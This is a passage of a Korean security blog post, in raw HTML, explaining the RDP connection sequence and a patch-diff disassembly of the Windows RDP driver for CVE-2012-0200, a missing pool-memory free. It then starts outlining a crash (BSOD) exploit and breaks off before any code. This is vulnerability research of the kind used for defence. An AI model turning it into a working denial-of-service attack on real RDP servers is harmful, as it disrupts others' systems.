원격 데스크톱 연결의 제어 터미널로\n불리며 서버는 제어가 되는 터미널이다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAACgElEQVQozzWSz2sTURDHJ0lTk23UVBCqtSXppvvmvbebdJPdfZtsk9rSX0na1Jg2iUYjCmkvWnsQFEGpt15KAwqC6KW3gl4qIiiI0Jugt17Eizf/BMXDyrY48IWZy2eG73wBmYBEXAOvjMlKkKr2LOU2RSZyyEQembiGXBSRHWkKmSWQi2nKRYZykU/p+d7hWBIoF0CoCYDMiiAaJzzgM9c9AscGEgFkVh9SK4jMChBq+pFZoCbHfcisEFLzFOWiDyDgcwrzcG4QA5QLCakpAWWWRLmIMi2bJ2g4lIsJlswlRmLcj9ySPBCiBZTagN4V3AozTQRzU/Og6c6klsrdS6YcWc9MeMeF4ObL16A7c7X1/QP30befv+8fHLq1x9t7ruvC1JXbYUXOAK1PgEJM8PrRWDrcancCO6+eQ7naeFderLul8sraXLEG2dxsCB5++QHmdLX95PCXu7zZ/eMBV3fffvCA0+vrUeW87kcucsiFNSIxn1rIn25srPa8//oJllZaby5dbrmLlWZnsdL0gGHPMl96oiyWN3c+xIfw78Xm6vfqg607ANCTaZUKynB6mGqCUs1GZSg9pDdmCqXtW9Lu5z2o/gcuNTsLlcYxkI85ET1fhMH+C3epartyTP0IAJK3iaTMk4kbWZBlHQbPIsQ3HKCZbKRxtd3zovsUKgv1/fJC3S2Wl9fmSzWwszMhz8g+LzZqulBGZnVYMnddHy/217e6QIgZJsQEOaGDLI95MyiKEUYq/LqYBKbZba5lu0y100y1AanV6+Un4mWIa7leyu04Ve0ooQYQZgYIMyXCTDj6NLOAHEtSqOFXk45fIcZAfGTsjIJGdJQYoKAZ/AcMa6VJGA6S9wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image27\"\n        title=\"image27\"\n        src=\"/static/66e9b456a76afcbf61f37d5e997817e2/d8f62/image27.png\"\n        srcset=\"/static/66e9b456a76afcbf61f37d5e997817e2/e9ff0/image27.png 180w,\n/static/66e9b456a76afcbf61f37d5e997817e2/f21e7/image27.png 360w,\n/static/66e9b456a76afcbf61f37d5e997817e2/d8f62/image27.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>4. RDP 프로토콜 연결 과정</strong></p>\n<p>RDP 프로토콜의 표준 연결 순서는 클라이언트와 서버의 설정 정보를 상호\n교환하면서 입력된다. 그래픽 정보, 데이터 등을 상호 교환을 하면서\n클라이언트와 서버 간에 연결을 진행</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"> <span class=\"token number\">1.</span>  클라이언트 서버가 네트워크 소켓 계층 초기 연결을 한 다음 RDP를   \n     설정                                                             \n                                                                      \n <span class=\"token number\">2.</span>  프로토콜의 기본 연결이 확인된 후에만 통신을 시작한다<span class=\"token punctuation\">.</span>            \n                                                                      \n <span class=\"token number\">3.</span>  클라이언트와 서버의 시스템 환경과 RDP 연결 환경 간의 정보 교환   \n     및 연결 확인 작업을 수행 <span class=\"token punctuation\">(</span>Connect Initial PDU<span class=\"token punctuation\">)</span>                   \n                                                                      \n <span class=\"token number\">4.</span>  RDP 프로토콜에서 이미지 정보<span class=\"token punctuation\">,</span> 사운드 정보<span class=\"token punctuation\">,</span> 장치 정보 및 클립     \n     보드 컨텐츠는 모두 단일 가상 채널에 존재한다<span class=\"token punctuation\">.</span>                    \n                                                                      \n <span class=\"token number\">5.</span>  전송용 가상 채널의 초기화 정보는 Connect Initial PDU 과정에서    \n     완료된다<span class=\"token punctuation\">.</span>                                                        </code></pre></div>\n<p>※ Protocol Data Unit (PDU): 데이터 통신에서 상위 계층이 전달한 데이터에\n붙이는 제어정보 e.g. ‘네트워크 계층 (packet), 전송 계층 (segment)’</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 540px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 147.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,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'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image28\"\n        title=\"image28\"\n        src=\"/static/5c901388207e2deb0a198ac931f6bf3d/07484/image28.png\"\n        srcset=\"/static/5c901388207e2deb0a198ac931f6bf3d/e9ff0/image28.png 180w,\n/static/5c901388207e2deb0a198ac931f6bf3d/f21e7/image28.png 360w,\n/static/5c901388207e2deb0a198ac931f6bf3d/07484/image28.png 540w\"\n        sizes=\"(max-width: 540px) 100vw, 540px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 546px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 112.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAIAAACEf/j0AAAACXBIWXMAAA7DAAAOwwHHb6hkAAADlklEQVQ4yz2U25KcNhCGebNd73rtqqwTxzd5gDh3qTypc+HxMsMIcRyEBEJCEpI4LQypQfF+F6ASdHX3/7fkPb7/7fHp8/OnP77+9c/Txy/vP/z+sO/cvXu+f/j08P63d4+/Pj59/vPr3x8+frl/eL5793x3/8vd/fPj02eP0qbrtJRStFJK1XW6qmrOWwijb9/+PRx+nM/g5cU/HH4cDj+Ox1OSJFEUhSGsa+rN83y9XhFCl8uFELJt2ziOy7LM81SWJSGEMZamadM0GGPO+TAM1pjXed62zbPWEkLSNM3zHABAKXXBZVkWRYEQiuO4KApKKdopiiKKojRNu667BV+v1+0n67oaY6Zp6vvelZOmaVmWboEQck9jTN/3nnvleY4xLstyHEellNYaIQQA8H3/dDpBCMMwjKIoSRIAAIQwyzIppccYy7IMAHA6nc7nc5Ik1tp1XZVSGOO2bZVSfd9ba9u27brOGCOl7Pv+1jNjrOs6a63W2n1gjGmtCSEvLy8IISFEvcMYc4umaSil1tqb2sMwOKkJIcuyDMMwTZMQIsuyKIoopVrrbkfuaK2VUtfr1RvHESEUBEGSJOfzua7reZ6XZem6ju4ghJRSQoimaVwCrbUQ4vX11dNaTzvzPLuFa5JzHoahS+60SNMUQuj7PqWUc/6/VUopAIAzo+97J0HTNBDCOI7hT4IgyPMcQogxrutaCOG5Jt1/cRxfr9dpmpZl0VpjjJ02hBCMcZZll8uFMSal7LpOKXUrmzEGAHDlOW2MMZzzfYbDOI4PhwOE8Hg8AgDSNOWcO81vwa6xdAchZK0dx7Ft2yRJ3iqqqspVW5YlpbSua0qpl2VZnudO6iRJgiDAGA/D0HWdEykIAsaYtfbNqqZppJTzPHtuVtzuOI7bthljhmGQUuZ5frlcop0sy9zZopQ2TSOEWJbFm6Zp27aiKI7HY1VV27YNw7AsixDCBRNCEEJVVTVN4xRhjK3rehvPYRi2bbPWvk2sMWYcRyllHMd5nrvM5U4cx2+trevqcc7bto2iyNkohGjb1vmcZVkYhqfTKQgC3/ejKAIAuCN9uVxuVhFCwjD0fR9CeD6f4zhmjPV9Tyl1VgEAgiD4/v27O3acc5dgHMebYPM8O2EwxsuyGGPmeW7bNgzDsizNjthxPQshOOe3soUQRVE4hwEARVEYY9Z1raoqCII4jimljDGMcVVVnHNCiFLKXTv/AXbCxQJzNsdVAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image 5 4 3\"\n        title=\"image 5 4 3\"\n        src=\"/static/d7d5b443a7cd532887c9fd85a81e4d34/76aed/image-5.4.3.png\"\n        srcset=\"/static/d7d5b443a7cd532887c9fd85a81e4d34/e9ff0/image-5.4.3.png 180w,\n/static/d7d5b443a7cd532887c9fd85a81e4d34/f21e7/image-5.4.3.png 360w,\n/static/d7d5b443a7cd532887c9fd85a81e4d34/76aed/image-5.4.3.png 546w\"\n        sizes=\"(max-width: 546px) 100vw, 546px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>※ X.224: X.224 연결 요청 PDU는 RDP 연결 시퀀스의 연결 시작 단계 동안\n클라이언트에서 서버로 전송되는 RDP 연결 시퀀스 PDU이다.</p>\n<h2 id=\"rdp-드라이버-패치-전-후-코드-비교\" style=\"position:relative;\"><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\" aria-label=\"rdp 드라이버 패치 전 후 코드 비교 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDP 드라이버 패치 전 후 코드 비교</h2>\n<p><strong>1. CVE-2012-0200 취약점 패치 전 RDP 드라이버 (v6.1.7600.16385) 버그\n발생 부분</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token function\">HandleAttachUserReq</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 함수에서 코드 수정이 이루어졌다<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">900</span>         lea     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">903</span>         push    eax\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">904</span>         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">907</span>         add     esi<span class=\"token punctuation\">,</span> <span class=\"token number\">74</span>h\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">90</span>A         push    esi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">90</span>B         call    SListRemove\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">910</span> quit<span class=\"token operator\">:</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">910</span>         mov     al<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span></code></pre></div>\n<p><strong>2. CVE-2012-0200 취약성 업데이트된 RDP 드라이버 (v6.1.7600.16963)\n부분</strong></p>\n<p>업데이트 후 코드 블록을 살펴보면 취약점이 존재했던 버전에서\nWDLIBRT_MemFree() 함수를 호출하는 것을 잊어버렸다는 사실을 알 수있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">913</span>         lea     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">916</span>         push    eax\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">917</span>         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>A         add     esi<span class=\"token punctuation\">,</span> <span class=\"token number\">74</span>h\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>D         push    esi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>E         call    SListRemove\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">91</span>E                                       <span class=\"token punctuation\">;</span> 추가된 코드 블록 부분\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">923</span>         mov     eax<span class=\"token punctuation\">,</span> \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>          <span class=\"token punctuation\">;</span> EAX 포인터 복원 부분\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">926</span>         cmp     eax<span class=\"token punctuation\">,</span> ebx              <span class=\"token punctuation\">;</span> <span class=\"token constant\">NULL</span> 값과 비교\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">928</span>         jz      <span class=\"token keyword\">short</span> quit            <span class=\"token punctuation\">;</span> 만약 <span class=\"token constant\">NULL</span> 값이면 QUIT\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92</span>A         cmp     \\<span class=\"token punctuation\">[</span>eax<span class=\"token operator\">+</span><span class=\"token number\">5</span>\\<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> bl\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92</span>D         jnz     <span class=\"token keyword\">short</span> quit\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">92F</span>         push    eax                   <span class=\"token punctuation\">;</span> Pool Memory 해제\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">930</span>         call    WDLIBRT_MemFree\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">935</span> quit<span class=\"token operator\">:</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">0002F</span><span class=\"token number\">935</span>         mov     al<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n\n<span class=\"token operator\">*</span><span class=\"token operator\">*</span>\\\n<span class=\"token operator\">*</span><span class=\"token operator\">*</span></code></pre></div>\n<p><strong>3. Pool Memory 블록을 할당한 후 해제하는 함수 ExFreePollWithTag()</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0 WDLIBRT_MemFree proc near   <span class=\"token punctuation\">;</span> <span class=\"token function\">ExFreePoolWithTag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>함수의 wrapper\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0 P               <span class=\"token operator\">=</span> dword ptr  <span class=\"token number\">8</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA0         mov     edi<span class=\"token punctuation\">,</span> edi\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA2         push    ebp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA3         mov     ebp<span class=\"token punctuation\">,</span> esp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA5         push    <span class=\"token number\">0</span>           <span class=\"token punctuation\">;</span> Tag값은 <span class=\"token constant\">NULL</span> 인 상태\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BA7         push    \\<span class=\"token punctuation\">[</span>ebp<span class=\"token operator\">+</span>P\\<span class=\"token punctuation\">]</span>     <span class=\"token punctuation\">;</span> P \\<span class=\"token operator\">&lt;</span><span class=\"token operator\">-</span> pool pointe<span class=\"token punctuation\">,</span> 인수로 전달한다<span class=\"token punctuation\">.</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BAA         call    ds<span class=\"token operator\">:</span>ExFreePoolWithTag\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB0         pop     ebp\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB1         retn    <span class=\"token number\">4</span>\n\n<span class=\"token punctuation\">.</span>text<span class=\"token operator\">:</span><span class=\"token number\">00013</span>BB1 WDLIBRT_MemFree endp</code></pre></div>\n<p>※ wrapper 함수: 기존에 함수를 한 번 감싸고 원래 동작에 기능 처리를 추가하는 함수</p>\n<p>※ Memory pool: C의 malloc, C++의 new 연산자와 유사한 메모리 동적할당을 가능하게 해준다.</p>\n<p>다른\n점은 malloc, new 연산자 같은 기능들은 다양한 블록사이즈 때문에 단편화를 유발시키고</p>\n<p>조각\n화된 메모리들을 퍼포먼스 때문에 실시간 시스템에서 사용할 수 없는 문제로 인해 Memory Pool을</p>\n<p>사용한다. 효율적인 방법으로 동일한 사이즈의 메모리 블록들을 미리 할당해 놓고 특정 트리거에 의해</p>\n<p>애플리케이션 이 필요할 때 마다. 메모리 블록들을 할당하고, 접근하고 해제할 수 있다</p>\n<p>RDP 드라이버 패치 전 버그 부분에서 Pool Memory 해제를 하지 않았다는\n사실을 알 수 있다. 해당 버그를 통해서 발생한 취약점이 루이지 아우라엠\n(Luigi Auriemma)이 보고한 CVE-2012-0200 취약점이다. 루이지 아우리엠은\nTCP/3389에서 RDP 서비스를 실행하는 취약한 서버를 충돌시키는 패킷을\n발표하였다.</p>\n<h2 id=\"공격-코드\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\" aria-label=\"공격 코드 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드</h2>\n<h3 id=\"공격-코드-분석\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"공격 코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격 코드 분석</h3>\n<p>공격코드는 크게 선언, 대상 서버로 전송되는 RDP 패킷 변조 페이로드 구성,\n대상 서버로 전송, BSOD 발생여부로 나눌 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 333px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADhUlEQVQ4y11UO48bVRS+SEhUEBAIkWQde573Ne/HnbHHj3W82eyuvd51kvU+sjjJ7ogFBQpEQQEFQkgIyUBjKJBo6JGQiCl4/AVaBAUNEilCqCiQyPiie2NHqxRH35lzvnvunDPfHECs9CNipT8ZMCwhwt5GhHGI4wIRVkAczxBhM9dvzBwvmzlefe7XZyI3zxdzPkeEvQv8sMVZ2uG6GXyJCPsN4lgUfDAvLEj84PAVvrN7xPOTN/no5m1+49brnFjpozzC8YO5/wdAhH2DCLsLMWOIsM9kIcJm8xvlIUwTaaLIAk9feIr/BTBgCBTNFYUBFkaTkFhpHdOkRu1qhmmaPX1mKXvu+Ur20jko7ZlnSxmmSUasVGAN06SBaRJgygDQzWCoGf57XtB6ChF2ZKLoR80I7hgwnKq6NxU4uDqabg0Op+1Of9pq96ZXrt2Ymiia6mYg0YDhHXEOETYCQbTMm8tdMcOvII7/pHaVR6zNXb8hZxvGbX44epXv7ue819+XsxTPtptxL2hywXe8ukSI43+B6zd+FR/GRPFtVfd/zhrrfO8g593NPX7z+A0+uDrim1sHvLM64FuDQ+lv9IYyPtw75u1On693h5ylK1wzgl/ACy9qZ86XsKIZPkA0WTJRdKxobm6iKFd1L9fNIMc0yYmVSoM4zi2nmiPCJEegDkPhH2GangUmijxF8zYV1QUQsyYi7HNMk4miuRNF9yZlxZmUytakrNjSKqozWbpAJxXVlb7gCf5cITXgBc1/sua6mOHHiLDfxec3YCRbXNvYkXO7Nrw1b3WXdy5ty3ZFToyl0drgBgznMmJ/Acer/x0nF0XwQyFskTBRxJvtHm+0ury53OP97ev84sq2vKTeXOcrqwOZu3T5yuMF7wrZuIrmblYUW7Rch5h9iggbV1R3XFGdcVmxx6ULVKIwRXPHpTJ9lFNUdyz4EMefIMJS0O70AQDgCSFwiJnQYiIS1K4m1K6mtpulmuGnZ8/DtKI6EnUzkHHLqUme4CPCGKLJk8Byaj8E0fJ9A4ZdRNh3i19uYaJ9IaussSb1Wa1f5n7YlPHHuYiw76WwhZZ0M/gWEXZvvhz+ExsEU1Zohl+srA6K6y+fFL3+fnHy2lvF2sZOoepegWkiN83DZSLPcfEvv6ObwdfUrp5DhH1wan0t1tPMgOFM1b2ZbgbSX8QXiB6ieMP3/wd1oKU6sv+hzQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image31\"\n        title=\"image31\"\n        src=\"/static/d496ae5b627a46e7a7ee27970d136a42/24c7e/image31.png\"\n        srcset=\"/static/d496ae5b627a46e7a7ee27970d136a42/e9ff0/image31.png 180w,\n/static/d496ae5b627a46e7a7ee27970d136a42/24c7e/image31.png 333w\"\n        sizes=\"(max-width: 333px) 100vw, 333px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>1. 공격 코드 RDP 패킷 